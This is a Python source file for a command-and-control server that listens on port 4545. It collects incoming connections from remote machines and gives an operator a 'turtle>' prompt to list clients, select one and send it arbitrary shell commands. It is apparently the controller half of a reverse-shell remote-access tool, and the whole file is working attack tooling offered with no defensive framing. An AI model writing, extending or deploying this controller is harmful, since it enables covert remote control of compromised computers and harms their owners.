import socket
import sys
import threading
from queue import Queue

THREAD_COUNT=2
JOB_NUMBER=[1,2]
queue=Queue()
all_connection=[]
all_address=[]
def create_socket():
    try:
        global host
        global port
        global server
        host=socket.gethostbyname(socket.gethostname())
        port=4545
        server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        print("Starting server......")
        print("IP : "+str(host))
        print("Port : "+str(port))
        bind_socket()
    except socket.error as msg:
        print("Socket error :"+ str(msg))
def bind_socket():
    try:
        server.bind((host,port))
        server.listen(5)
        print("Server start Successful")
        print(".......................")
    except socket.error as msg:
        print("Socket binding error : "+str(msg))
        print("Trying again...")
        bind_socket()
def accept_connections():
    for c in all_connection:
        c.close()
    del all_connection[:]
    del all_address[:]

    while True:
        try:
            conn,address=server.accept()
            server.setblocking(1)
            all_address.append(address)
            all_connection.append(conn)
            print("\nConnection accepted : "+address[0]+"  "+str(address[1]))
        except:
            print("Error accepting connections")
def list_connections():
    results=''
    if(len(all_connection)==0):
        print("----Clients----")
        print("No Clients connected")
        return
    for i,conn in enumerate(all_connection):
        try:
            conn.send(str.encode("testing"))
            conn.recv(1024)
        except:
            del all_connection[i]
            del all_address[i]
            continue
        results+=str(i)+"  "+str(all_address[i][0])+"  "+str(all_address[i][1])+"\n" 
    print("----Clients----"+"\n"+results)
def get_connection(cmd):
    try:
        target=cmd.replace("select ","")
        target=int(target)
        conn=all_connection[target]
        print("Connected to : "+str(all_address[target][0]))
        print(str(all_address[target][0])+"@",end="")
        return conn,target
    except:
        print("Selection not Valid")
        return None,-1
def send_commands(conn,target):
    while True:
        try:
            conn.send(str.encode("cwd"))
            response=conn.recv(1024).decode("utf-8")
            cmd=input(str(all_address[target][0])+"@"+response+"> ")
            if(cmd=="quit"):
                break
            if(len(str.encode(cmd))>0):
                conn.send(str.encode(cmd))
                response=conn.recv(4096).decode("utf-8")
                if(response!=" "):
                    print(str(all_address[target][0])+"@"+response)
        except:
            print("Error sending command")
def start_turtle():
    while True:
        cmd=input("turtle> ")
        if (cmd=="list"):
            list_connections()
        elif "select" in cmd:
            conn,target=get_connection(cmd)
            if conn is not None:
                send_commands(conn,target)
            else:
                print("Connection does not exist!!")
        else:
            print("Command not recognized")

def create_threads():
    for i in range(THREAD_COUNT):
        t=threading.Thread(target=work)
        t.daemon=True
        t.start()
def work():
    x=queue.get()
    if x==1:
        accept_connections()
    if x==2:
        start_turtle()
    queue.task_done()
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()
create_socket()
create_threads()
create_jobs()

